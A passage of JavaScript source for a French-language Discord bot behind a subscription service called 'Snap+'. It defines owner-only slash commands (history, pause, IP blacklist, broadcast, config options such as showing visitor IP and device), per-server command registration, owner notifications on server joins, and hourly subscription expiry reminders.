                    .addIntegerOption(o => o.setName('utilisations').setDescription('Nombre max d\'utilisations (défaut: 1)').setRequired(false).setMinValue(1))
                    .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
                    .toJSON(),

                new SlashCommandBuilder()
                    .setName('clear')
                    .setDescription('🗑️ Vider toutes les demandes en attente [OWNER ONLY]')
                    .toJSON(),

                new SlashCommandBuilder()
                    .setName('history')
                    .setDescription('📋 Voir les 10 dernières demandes [OWNER ONLY]')
                    .toJSON(),

                new SlashCommandBuilder()
                    .setName('pause')
                    .setDescription('⏸️ Désactiver le site immédiatement [OWNER ONLY]')
                    .toJSON(),

                new SlashCommandBuilder()
                    .setName('resume')
                    .setDescription('▶️ Réactiver le site [OWNER ONLY]')
                    .toJSON(),

                new SlashCommandBuilder()
                    .setName('pending')
                    .setDescription('⏳ Voir les demandes en attente avec timing [OWNER ONLY]')
                    .toJSON(),

                new SlashCommandBuilder()
                    .setName('blacklist')
                    .setDescription('🚫 Gérer la blacklist d\'IPs [OWNER ONLY]')
                    .addSubcommand(s => s.setName('add').setDescription('Ajouter une IP')
                        .addStringOption(o => o.setName('ip').setDescription('Adresse IP').setRequired(true)))
                    .addSubcommand(s => s.setName('remove').setDescription('Retirer une IP')
                        .addStringOption(o => o.setName('ip').setDescription('Adresse IP').setRequired(true)))
                    .addSubcommand(s => s.setName('list').setDescription('Voir la blacklist'))
                    .toJSON(),

                new SlashCommandBuilder()
                    .setName('broadcast')
                    .setDescription('📢 Envoyer un message à tous les serveurs clients [OWNER ONLY]')
                    .addStringOption(o => o.setName('message').setDescription('Message à envoyer').setRequired(true))
                    .addStringOption(o => o.setName('titre').setDescription('Titre (optionnel)').setRequired(false))
                    .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
                    .toJSON(),

                new SlashCommandBuilder()
                    .setName('config')
                    .setDescription('⚙️ Gérer les paramètres du site/bot [OWNER ONLY]')
                    .addSubcommand(sub => sub
                        .setName('show')
                        .setDescription('Voir la configuration actuelle')
                    )
                    .addSubcommand(sub => sub
                        .setName('set')
                        .setDescription('Modifier un paramètre')
                        .addStringOption(opt => opt
                            .setName('parametre')
                            .setDescription('Paramètre à modifier')
                            .setRequired(true)
                            .addChoices(
                                { name: '🌐 Site actif (true/false)',           value: 'site_actif' },
                                { name: '🔒 Rate limiting actif (true/false)',  value: 'ratelimit_actif' },
                                { name: '⏱️ Durée rate limit (minutes, 1-60)',  value: 'ratelimit_minutes' },
                                { name: '🌍 Afficher IP (true/false)',           value: 'afficher_ip' },
                                { name: '📱 Afficher appareil/OS (true/false)', value: 'afficher_appareil' },
                                { name: '👁️ Salon prioritaire (true/false)',    value: 'salon_prioritaire' },
                                { name: '⏱️ Délai Discord (secondes, 1-60)',    value: 'delai_discord_sec' },
                                { name: '⏰ Timeout demandes (minutes, 1-30)', value: 'timeout_minutes' },
                                { name: '🔗 Webhook fallback (true/false)',     value: 'webhook_fallback' },
                                { name: '🛡️ Bloquer VPN/proxy (true/false)',   value: 'bloquer_vpn' },
                            )
                        )
                        .addStringOption(opt => opt
                            .setName('valeur')
                            .setDescription('Nouvelle valeur (true/false ou nombre)')
                            .setRequired(true)
                        )
                    )
                    .addSubcommand(sub => sub
                        .setName('reset')
                        .setDescription('Remettre tous les paramètres par défaut')
                    )
                    .toJSON(),
        ];

        // Supprimer les anciennes global commands (évite les doublons)
        await rest.put(Routes.applicationCommands(client.user.id), { body: [] });

        // Fonction réutilisable pour enregistrer les commandes d'un guild selon son niveau
        async function registerGuildCommands(guildId) {
            let cmds;
            const guild = client.guilds.cache.get(guildId);
            if (!guild) return;
            // Déterminer si l'owner est dans ce serveur
            const isOwnerGuild = guild.members.cache.has(OWNER_ID) || (await guild.members.fetch(OWNER_ID).catch(() => null));
            if (isOwnerGuild) {
                cmds = ownerCmds;
            } else if (hasGuildBotAccess(guildId)) {
                cmds = botCmds;
            } else {
                cmds = publicCmds;
            }
            try {
                await rest.put(Routes.applicationGuildCommands(client.user.id, guildId), { body: cmds });
                console.log(`[CMDS] ${guild.name} → ${cmds.length} commandes (${isOwnerGuild ? 'owner' : hasGuildBotAccess(guildId) ? 'bot' : 'public'})`);
            } catch(e) {
                console.warn(`⚠️ Commands non enregistrées dans ${guildId}: ${e.message}`);
            }
        }

        // Enregistrer pour tous les guilds actuels
        let registeredCount = 0;
        for (const [guildId] of client.guilds.cache) {
            await registerGuildCommands(guildId);
            registeredCount++;
        }
        console.log(`✅ Slash commands enregistrées dans ${registeredCount} serveur(s) (sets public/bot/owner selon accès)`);

        // Exposer la fonction pour la réutiliser lors des changements d'accès
        client._registerGuildCommands = registerGuildCommands;
    } catch (e) {
        console.error('Erreur enregistrement slash commands:', e.message);
    }

    // Statut initial
    updateBotStatus();

    // Status embed auto-update (toutes les 60s)
    setInterval(updateStatusEmbed, 60 * 1000);
    if (cfg.status_channel_id) updateStatusEmbed(); // 1ère mise à jour au démarrage

    // Vider la file d'attente
    while (pendingMessages.length > 0) {
        const fn = pendingMessages.shift();
        try { await fn(); } catch (e) { console.error('Erreur file attente:', e.message); }
    }
});

// ================== GUILD JOIN / LEAVE ==================
client.on('guildCreate', async (guild) => {
    console.log(`[GUILD] Bot ajouté sur : ${guild.name} (${guild.id})`);
    // Enregistrer les commandes adaptées au niveau d'accès du nouveau serveur
    if (client._registerGuildCommands) await client._registerGuildCommands(guild.id);
    if (!cfg.guild_notifications) cfg.guild_notifications = [];
    cfg.guild_notifications.unshift({
        guildId: guild.id,
        name: guild.name,
        icon: guild.iconURL({ size: 64 }) || null,
        memberCount: guild.memberCount,
        joinedAt: Date.now(),
        seen: false
    });
    // Garder seulement les 50 dernières notifs
    if (cfg.guild_notifications.length > 50) cfg.guild_notifications = cfg.guild_notifications.slice(0, 50);
    saveConfig(cfg);

    // Notification DM à l'owner
    try {
        const owner = await client.users.fetch(OWNER_ID);
        await owner.send({ embeds: [new EmbedBuilder()
            .setTitle('🆕 Nouveau serveur !')
            .setDescription(`Le bot vient d'être ajouté sur **${guild.name}**`)
            .setColor(0x00FF6A)
            .setThumbnail(guild.iconURL({ size: 64 }) || null)
            .addFields(
                { name: '🆔 Guild ID', value: guild.id, inline: true },
                { name: '👥 Membres', value: String(guild.memberCount), inline: true }
            )
            .setFooter({ text: 'Gérer → Dashboard → Serveurs' })
            .setTimestamp()
        ]});
    } catch(e) {}
});

client.on('guildDelete', (guild) => {
    console.log(`[GUILD] Bot retiré de : ${guild.name} (${guild.id})`);
});

client.login(process.env.DISCORD_BOT_TOKEN);

// ================== EXPIRATION SUBS + RAPPEL 3 JOURS ==================
setInterval(async () => {
    if (!botReady) return;
    const now = Date.now();
    const threeDays = 3 * 24 * 60 * 60 * 1000;
    let changed = false;

    for (const [userId, sub] of Object.entries(subs)) {
        if (!sub.active) continue;

        // Auto-désactivation expirés
        if (sub.expiresAt && sub.expiresAt < now) {
            sub.active = false;
            changed = true;
            try {
                const user = await client.users.fetch(userId);
                await user.send({ embeds: [new EmbedBuilder()
                    .setTitle('⏰ Abonnement expiré')
                    .setDescription('Ton accès **Snap+** a expiré.\nContacte le créateur pour renouveler.')
                    .setColor(0xFF4444)
                    .setFooter({ text: 'Snap+ Bot' })
                    .setTimestamp()
                ]});
            } catch(e) {}
            continue;
        }

        // Rappel 3 jours avant expiration
        if (sub.expiresAt && !sub.reminderSent) {
            const timeLeft = sub.expiresAt - now;
            if (timeLeft <= threeDays && timeLeft > 0) {
                const daysLeft = Math.ceil(timeLeft / (24 * 60 * 60 * 1000));
                try {
                    const user = await client.users.fetch(userId);
                    await user.send({ embeds: [new EmbedBuilder()
                        .setTitle('⚠️ Abonnement bientôt expiré')
                        .setDescription(`Ton accès **Snap+** expire dans **${daysLeft} jour${daysLeft > 1 ? 's' : ''}**.\nContacte le créateur pour renouveler.`)
                        .setColor(0xFF8800)
                        .setFooter({ text: 'Snap+ Bot' })
                        .setTimestamp()
                    ]});
                    sub.reminderSent = true;
                    changed = true;
                } catch(e) {}
            }
        }
    }

    if (changed) saveSubs(subs);
}, 60 * 60 * 1000); // toutes les heures

httpServer.listen(PORT, () => {
    console.log(`🚀 Serveur web lancé sur ${BASE_URL}`);
});
